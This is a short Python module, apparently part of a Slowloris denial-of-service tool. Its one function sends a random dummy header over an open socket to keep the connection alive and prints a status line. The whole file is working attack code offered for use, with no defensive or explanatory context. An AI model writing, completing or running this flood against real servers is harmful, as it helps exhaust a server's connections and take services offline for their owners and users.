"""This module provides the flood function for a Slowloris DoS attack."""

import random
import socket

from colorama import Fore  # type: ignore[import]


def flood(sock: socket.SocketType) -> None:
    """Keep alive the sockets in Slowloris flood.

    Args:
        - sock - The socket to be kept alive

    Returns:
        None
    """
    header = f"X-a: {random.randint(1, 5000)}"
    sock.send(header.encode("utf-8"))
    print(
        f"{Fore.GREEN} --> Keeping Socket Alive... {Fore.RESET}|{Fore.CYAN} Header Sent: {header}{Fore.RESET}"
    )
